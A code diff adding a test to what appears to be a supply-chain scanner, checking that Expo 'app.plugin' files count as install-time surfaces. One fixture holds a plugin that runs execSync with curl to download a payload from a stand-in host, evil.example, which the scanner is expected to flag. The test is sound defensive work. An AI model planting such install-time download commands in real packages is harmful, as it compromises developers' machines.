@@ -67,6 +67,44 @@ test("an install-time download inside an Expo config is recorded as a download",
   ]);
 });
 
+test("an Expo config plugin is an install surface", () => {
+  // `@expo/config` calls `withConfigPlugins` on every config load, and
+  // `@expo/config-plugins` resolves `<package>/app.plugin` over the
+  // same six spellings as the dynamic config and evaluates the file —
+  // including TypeScript entries — so a plugin runs on the same path
+  // as `app.config.<ext>` whenever the CLI loads the project
+  // configuration. A static `app.json` naming the package is enough to
+  // run it, so the name alone decides, wherever the package sits.
+  for (const path of [
+    "app.plugin.js",
+    "app.plugin.ts",
+    "app.plugin.mjs",
+    "app.plugin.cjs",
+    "app.plugin.mts",
+    "app.plugin.cts",
+    "packages/my-plugin/app.plugin.js",
+  ]) {
+    expect({ path, surfaces: surfacesOf(path) }).toEqual({
+      path,
+      surfaces: ["installScripts", "source"],
+    });
+  }
+  // The `.json` spelling is not one of them: the plugin resolver never
+  // probes it, so it stays source alone.
+  expect(surfacesOf("app.plugin.json")).toEqual(["source"]);
+  // A payload in it carries the install coverage the surface brings:
+  // the same bytes in `app.config.ts` record a download and a finding,
+  // and in the plugin they recorded nothing before this classification.
+  const inspection = inspected(
+    "packages/my-plugin/app.plugin.js",
+    "import { execSync } from 'node:child_process';\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nexport default {};\n",
+  );
+  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
+  expect(inspection.visibilityGaps).toEqual([
+    "Install-time download not retrieved: https://evil.example/payload",
+  ]);
+});
+
 test("an ordinary Expo config keeps no finding", () => {
   const inspection = inspected(
     "app.config.js",
